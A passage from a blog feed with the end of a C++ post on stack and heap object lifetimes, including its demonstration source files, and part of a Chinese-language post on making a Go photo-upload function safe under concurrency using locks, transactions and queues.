<li><p>Heap objects, generally allocated via <code>new</code>, have lifetimes that differ from stack objects. Their lifetimes are fully controlled by the programmer, meaning manual control of the heap object&#39;s lifetime is required. Their destruction occurs when the corresponding <code>delete</code> is called.</p>
</li>
</ol>
<p>there is also another case I didn&#39;t mention, its object inside objects. Maybe I will cover it later. but for now, just stick with those two concepts.</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://joellaity.com/2020/01/31/string.html">libc++&#39;s implementation of std::string</a></li>
<li><a href="https://en.cppreference.com/w/cpp/language/scope">cpp scopes</a></li>
<li><a href="https://developer.aliyun.com/article/582674">消灭“脑细胞杀手”，阿里专家带你深入C++对象的生命周期管理</a></li>
<li><a href="https://nihil.cc/posts/cpp_lvalue_rvalue/">[C++] 深入了解左值与右值</a></li>
<li><a href="https://www.cnblogs.com/liushui-sky/p/8004763.html">浅谈C++中对象的复制与对象之间的相互赋值</a></li>
</ul>
<h1 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h1><h2 id="check-location-cpp"><a href="#check-location-cpp" class="headerlink" title="check_location.cpp"></a>check_location.cpp</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cstring&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_memory_mapping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE * f = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to open /proc/self/maps\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fgets</span>(buffer, <span class="number">1024</span>, f)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_self_address</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * name, <span class="type">void</span> **addr_start, <span class="type">void</span> **addr_end)</span> </span>&#123;</span><br><span class="line">    FILE *maps_file = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!maps_file) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fgets</span>(line, <span class="built_in">sizeof</span>(line), maps_file)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, name)) &#123;</span><br><span class="line">            <span class="comment">// The line contains the stack segment</span></span><br><span class="line">            <span class="built_in">sscanf</span>(line, <span class="string">&quot;%p-%p&quot;</span>, addr_start, addr_end);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(maps_file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *stack_start, *stack_end;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_stack_address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">get_self_address</span>(<span class="string">&quot;[stack]&quot;</span>, &amp;stack_start, &amp;stack_end);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack segment: %p-%p\n&quot;</span>, stack_start, stack_end);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_stack_address</span><span class="params">(<span class="type">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= stack_start &amp;&amp; addr &lt;= stack_end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *heap_start, *heap_end;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_heap_address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">get_self_address</span>(<span class="string">&quot;[heap]&quot;</span>, &amp;heap_start, &amp;heap_end);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Heap segment: %p-%p\n&quot;</span>, heap_start, heap_end);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_heap_address</span><span class="params">(<span class="type">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= heap_start &amp;&amp; addr &lt;= heap_end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_address_location</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * name, <span class="type">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">is_stack_address</span>(addr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s (%p) is in [stack]\n&quot;</span>,  name, addr);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">is_heap_address</span>(addr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s (%p) is in [heap]\n&quot;</span>, name, addr);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s (%p) is in other segment\n&quot;</span>, name, addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">some_external_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * cstr)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//void * operator new(size_t size) &#123;</span></span><br><span class="line"><span class="comment">//    void * mem = malloc(size);</span></span><br><span class="line"><span class="comment">//    printf(&quot;[Allocation Tracker] allocating %ld bytes at %p\n&quot;, size,mem);</span></span><br><span class="line"><span class="comment">//    return mem;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//void operator delete(void * mem) &#123;</span></span><br><span class="line"><span class="comment">//    printf(&quot;[Allocation Tracker] free memory from %p\n&quot;, mem);</span></span><br><span class="line"><span class="comment">//    free(mem);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init_heap_address</span>();</span><br><span class="line">    <span class="built_in">init_stack_address</span>();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;init s1 string&quot;</span>);</span><br><span class="line">    std::string s1 = <span class="string">&quot;Hello! World!&quot;</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;init s2 string&quot;</span>);</span><br><span class="line">    std::string s2 = <span class="string">&quot;Heeeeeeeeeeeeeeeeeeeeeeeeeeeeeeello, World!&quot;</span>;</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s1&quot;</span>, (<span class="type">void</span> *)&amp;s1);</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s1 cstr&quot;</span>, (<span class="type">void</span> *)s<span class="number">1.</span><span class="built_in">data</span>());</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s2&quot;</span>, (<span class="type">void</span> *)&amp;s2);</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s2 cstr&quot;</span>, (<span class="type">void</span> *)s<span class="number">2.</span><span class="built_in">data</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="obj-on-heap-cpp"><a href="#obj-on-heap-cpp" class="headerlink" title="obj_on_heap.cpp"></a>obj_on_heap.cpp</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Nanami</span>&#123;</span><br><span class="line">    std::string name;</span><br><span class="line">    <span class="type">void</span> * ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Nanami</span>(<span class="type">const</span> std::string &amp; name) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        std::cout &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt;<span class="string">&quot;: owu I got created&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Nanami</span>() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt;<span class="string">&quot;: owo I got destroyed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lol</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span><span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">block_memory_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        Nanami * onheap = <span class="keyword">new</span> <span class="built_in">Nanami</span>(<span class="string">&quot;leak inside block&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">good_procedure</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Nanami * mynanami= <span class="keyword">new</span> <span class="built_in">Nanami</span>(<span class="string">&quot;mynanami&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> mynanami;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">good_procedure</span>();</span><br><span class="line">    <span class="built_in">block_memory_leak</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="obj-on-stack-cpp"><a href="#obj-on-stack-cpp" class="headerlink" title="obj_on_stack.cpp"></a>obj_on_stack.cpp</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Nanami</span>&#123;</span><br><span class="line">    std::string name;</span><br><span class="line">    <span class="type">void</span> * ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Nanami</span>(<span class="type">const</span> std::string &amp; name) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        std::cout &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt;<span class="string">&quot;: owu I got created&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Nanami</span>() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt;<span class="string">&quot;: owo I got destroyed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lol</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span><span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">local_nanami_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Nanami <span class="title">lcl</span><span class="params">(<span class="string">&quot;local scope&quot;</span>)</span></span>;</span><br><span class="line">    lcl.<span class="built_in">lol</span>();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;before exit local&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">local_nanami</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt; before local&quot;</span>);</span><br><span class="line">    <span class="built_in">local_nanami_</span>();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;&lt;&lt;&lt;&lt; after exit local&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">block_nanami</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt; before block&quot;</span>);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function">Nanami <span class="title">bls</span><span class="params">(<span class="string">&quot;block scope&quot;</span>)</span></span>;</span><br><span class="line">        bls.<span class="built_in">lol</span>();</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;before exit block&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;&lt;&lt;&lt;&lt; after exit block&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">temporary_nanami</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt; before xvalue scope&quot;</span>);</span><br><span class="line">    <span class="type">int</span> val = <span class="built_in">Nanami</span>(<span class="string">&quot;xvalue scope&quot;</span>).<span class="built_in">lol</span>();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;&lt;&lt;&lt;&lt; after xvalue scope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// todo: wtf????</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">reassign_nanami</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt; reconstruct_nanami&quot;</span>);</span><br><span class="line">    <span class="function">Nanami <span class="title">nanami</span><span class="params">(<span class="string">&quot;first initialization&quot;</span>)</span></span>;</span><br><span class="line">    nanami = <span class="built_in">Nanami</span>(<span class="string">&quot;second initialization&quot;</span>);</span><br><span class="line">    nanami.<span class="built_in">lol</span>();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;&lt;&lt;&lt;&lt; reconstruct_nanami&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">block_memory_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        Nanami * onheap = <span class="keyword">new</span> <span class="built_in">Nanami</span>(<span class="string">&quot;leak inside bloc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Nanami <span class="title">glb</span><span class="params">(<span class="string">&quot;Global scope&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;enter main&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">local_nanami</span>();</span><br><span class="line">    <span class="built_in">block_nanami</span>();</span><br><span class="line">    <span class="built_in">temporary_nanami</span>();</span><br><span class="line"><span class="comment">//    reconstruct_nanami();</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">block_memory_leak</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;before exit main&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Allocation-Tracker-Snippet"><a href="#Allocation-Tracker-Snippet" class="headerlink" title="Allocation Tracker Snippet"></a>Allocation Tracker Snippet</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> * <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="type">void</span> * mem = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Allocation Tracker] allocating %ld bytes at %p\n&quot;</span>, size,mem);</span><br><span class="line">    <span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> * mem)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Allocation Tracker] free memory from %p&quot;</span>, mem);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>用一个例子来简单介绍保证并发安全的几种方式</title>
    <url>/articles/coding/explain-thread-safe-methods-using-example/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>大家好，我是说的道理，今天来点大家想看的东西啊。</p>
<span id="more"></span>

<h1 id="问题介绍"><a href="#问题介绍" class="headerlink" title="问题介绍"></a>问题介绍</h1><p>那么这边呢是我们的示例代码，在我自己做code review的时候我就发现了这边有很大概率会出现race condition的情况。但是我当时没管，因为我认为在我的应用场景下大概率碰不到这种情况。但是实际还是出现了，那么就来修复一下。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// todo: make it thread safe, now it&#x27;s not, photos might be overwritten</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *srvImpl)</span></span> AddPhotos(userID <span class="type">string</span>, mealCreateAt time.Time, photo [][]<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line">    fileIds := <span class="built_in">make</span>([]storage.FileID, <span class="number">0</span>, <span class="built_in">len</span>(photo))</span><br><span class="line">    <span class="keyword">for</span> _, p := <span class="keyword">range</span> photo &#123;</span><br><span class="line">        fileId, err := s.storageApi.StoreAt(<span class="string">&quot;&quot;</span>, <span class="string">&quot;photo&quot;</span>, p, storage.FileMeta&#123;</span><br><span class="line">            Prefix:   <span class="string">&quot;&quot;</span>,</span><br><span class="line">            Filename: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            Length:   <span class="number">0</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            s.log.ErrorW(<span class="string">&quot;store photo failed&quot;</span>, <span class="string">&quot;err&quot;</span>, err, <span class="string">&quot;userID&quot;</span>, userID, <span class="string">&quot;createAt&quot;</span>, mealCreateAt)</span><br><span class="line">            <span class="keyword">return</span> foodiary.ErrFailToGetMeal</span><br><span class="line">        &#125;</span><br><span class="line">        fileIds = <span class="built_in">append</span>(fileIds, fileId)</span><br><span class="line">    &#125;</span><br><span class="line">    meal, err := s.repo.FindMeal(userID, mealCreateAt)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        s.log.ErrorW(<span class="string">&quot;find meal failed&quot;</span>, <span class="string">&quot;err&quot;</span>, err, <span class="string">&quot;userID&quot;</span>, userID, <span class="string">&quot;createAt&quot;</span>, mealCreateAt)</span><br><span class="line">        <span class="keyword">return</span> foodiary.ErrMealNotFound</span><br><span class="line">    &#125;</span><br><span class="line">    meal.Photos = <span class="built_in">append</span>(meal.Photos, fileIds...)</span><br><span class="line">    err = s.repo.Upsert(meal)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        s.log.ErrorW(<span class="string">&quot;upsert meal failed&quot;</span>, <span class="string">&quot;err&quot;</span>, err, <span class="string">&quot;userID&quot;</span>, userID, <span class="string">&quot;createAt&quot;</span>, mealCreateAt)</span><br><span class="line">        <span class="keyword">return</span> foodiary.ErrFailModifyMeal</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>先不提repo层的设计问题，单纯来看如何解决并发问题。实际上，问题出现在<code>FindMeal</code>和<code>Upsert</code>之间，如果两个线程同时执行这个函数，一个线程往<code>Meal</code>中添加图片A，另一个线程往同一个<code>Meal</code>里添加图片B，那么就很有可能出现只有图片A被添加，或者只有图片B被添加的情况。</p>
<p><img data-src="/images/coding/explain-thread-safe-methods-using-example/Screenshot_20241018_134544.png"></p>
<p>所以要解决这个问题，就是要保证一个线程在<code>FindMeal</code>到<code>Upsert</code>这段完成之间，没有其他线程能够修改这个<code>Meal</code>。</p>
<p>那么要实现这些功能，我们可以从如下几个方向思考：</p>
<ol>
<li>锁 (Locking)</li>
<li>事务 (Transaction)</li>
<li>队列 (Queue)</li>
</ol>
<h1 id="锁-Locking"><a href="#锁-Locking" class="headerlink" title="锁 Locking"></a>锁 Locking</h1><p>锁大致可以分为乐观锁和悲观锁，在这里我们会分别介绍</p>
<h2 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h2><p>这个就是最常见的锁的概念，假设一定会发生冲突，所以在操作一个资源的时候，停止一切其他线程对这个资源的操作。</p>
<p>至于这个锁要怎么实现，那就取决与你自己的选择了。比如，如果你的资源需要在好多个服务间或者分布式系统中使用，那么可以使用类似redis的方式来<strong>实现分布式锁</strong>，这种方式可以在分布式环境下有效保证资源的一致性。如果只是单个应用，那么可以直接使用<strong>应用内存锁</strong>，例如使用<code>sync.Mutex</code>，来控制同一时刻只有一个线程能访问资源。</p>
<p><strong>优缺点：</strong></p>
<ul>
<li><strong>优点：</strong>适用于高冲突场景，确保数据的一致性和正确性。任何时候只有一个线程可以操作资源，避免了并发修改导致的数据不一致问题。</li>
<li><strong>缺点：</strong>会阻塞其他线程的访问，可能会导致性能下降，尤其是在资源锁定时间长的情况下，降低系统的并发性。</li>
</ul>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">lockKey := fmt.Sprintf(<span class="string">&quot;meal_lock:%s:%d&quot;</span>, userID, mealCreateAt.Unix())</span><br><span class="line">lock, err := redisClient.Lock(lockKey, <span class="number">5</span>*time.Second)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> lock.Unlock()</span><br><span class="line"></span><br><span class="line">meal, err := s.repo.FindMeal(userID, mealCreateAt)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> foodiary.ErrMealNotFound</span><br><span class="line">&#125;</span><br><span class="line">meal.Photos = <span class="built_in">append</span>(meal.Photos, fileIds...)</span><br><span class="line">err = s.repo.Upsert(meal)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> foodiary.ErrFailModifyMeal</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h2><p>简单来说就是假设每次拿数据的时候都认为没有其他线程会对同一个资源进行修改，所以不对该操作进行上锁。但是如果要修改资源，则先提交资源修改的请求，再确认这个资源是否被修改过了。如果没有被修改过，那就很好。如果被修改过了，那么就放弃本次操作，或者重新获取资源，并重试本次操作直到成功。</p>
<p>一般来说，实现乐观锁可以通过添加一个独立的可比较的字段实现，比如版本号、时间戳等。</p>
<p>比如使用版本号，可以在每次对数据进行更新的时候对版本号+1，在更新的时候判断这条数据是否还是原来的版本号，如果是的就更新，如果不是，就是有另外一个线程修改了这个资源。</p>
<p><strong>优缺点</strong>：</p>
<ul>
<li><strong>优点</strong>：不需要持有锁，性能好，适用于低并发场景。</li>
<li><strong>缺点</strong>：如果冲突频繁，会导致不断重试，降低性能。</li>
</ul>
<p>比如，我们可以通过如下代码实现乐观锁，当出现<code>foodiary.ErrConflict</code>的时候，对该操作进行重试。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">meal, err := s.repo.FindMeal(userID, mealCreateAt)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> foodiary.ErrMealNotFound</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">originalVersion := meal.Version</span><br><span class="line">meal.Photos = <span class="built_in">append</span>(meal.Photos, newFileIds...)</span><br><span class="line">meal.Version++</span><br><span class="line"></span><br><span class="line">err = s.repo.UpsertWithVersion(meal, originalVersion)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err == foodiary.ErrVersionConflict &#123;</span><br><span class="line">        s.log.ErrorW(<span class="string">&quot;conflict detected while updating meal&quot;</span>, <span class="string">&quot;userID&quot;</span>, userID, <span class="string">&quot;createAt&quot;</span>, mealCreateAt)</span><br><span class="line">        <span class="keyword">return</span> foodiary.ErrConflict</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> foodiary.ErrFailModifyMeal</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="事务-Transaction"><a href="#事务-Transaction" class="headerlink" title="事务 (Transaction)"></a>事务 (Transaction)</h1><p>事务是数据库管理中的概念，通常用来保证一组操作要么全部成功，要么全部失败回滚。事务在保证数据一致性方面非常有用，尤其是在多个操作需要原子性的时候。</p>
<p>例如，在处理<code>Meal</code>时，如果我们需要同时更新<code>Meal</code>的多个字段（如添加照片和更新描述），使用事务可以确保这些操作要么全部成功，要么全部失败，以保持数据的一致性。</p>
<p>但是在我们的场景中，事务并不完全适用。因为我们的问题是多个线程在同时尝试修改同一个<code>Meal</code>，而事务的作用是在单次操作中保证原子性，并不能防止多个线程竞争修改同一条数据。因此，单纯使用事务并不能彻底解决并发冲突的问题。</p>
<h1 id="队列-Queue"><a href="#队列-Queue" class="headerlink" title="队列 (Queue)"></a>队列 (Queue)</h1><p>另一种常见的解决并发修改问题的方法是使用队列。我们可以将每个对<code>Meal</code>的修改请求都放入一个队列中，确保所有的修改操作是按顺序执行的。</p>
<p>在Go语言中，我们可以使用<code>chan</code>来实现一个简单的队列。例如：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> mealUpdateTask <span class="keyword">struct</span> &#123;</span><br><span class="line">    userID      <span class="type">string</span></span><br><span class="line">    mealCreateAt time.Time</span><br><span class="line">    photos       [][]<span class="type">byte</span></span><br><span class="line">    errChan      <span class="keyword">chan</span> <span class="type">error</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tasksChan := <span class="built_in">make</span>(<span class="keyword">chan</span> mealUpdateTask)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *srvImpl)</span></span> processTasks() &#123;</span><br><span class="line">    <span class="keyword">for</span> task := <span class="keyword">range</span> tasksChan &#123;</span><br><span class="line">        err := s.addPhotosInternal(task.userID, task.mealCreateAt, task.photos)</span><br><span class="line">        task.errChan &lt;- err</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *srvImpl)</span></span> AddPhotos(userID <span class="type">string</span>, mealCreateAt time.Time, photos [][]<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line">    errChan := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">error</span>)</span><br><span class="line">    tasksChan &lt;- mealUpdateTask&#123;userID, mealCreateAt, photos, errChan&#125;</span><br><span class="line">    <span class="keyword">return</span> &lt;-errChan</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方式通过一个单独的处理线程来串行化所有的对<code>Meal</code>的修改操作，确保不会有并发问题。当然，对于复杂的生产环境，我们可以引入消息队列系统，例如RabbitMQ、Kafka等，用来处理更多的请求和提高可靠性。</p>
<p><strong>优缺点</strong>：</p>
<ul>
<li><strong>优点</strong>：保证操作顺序，避免并发问题。</li>
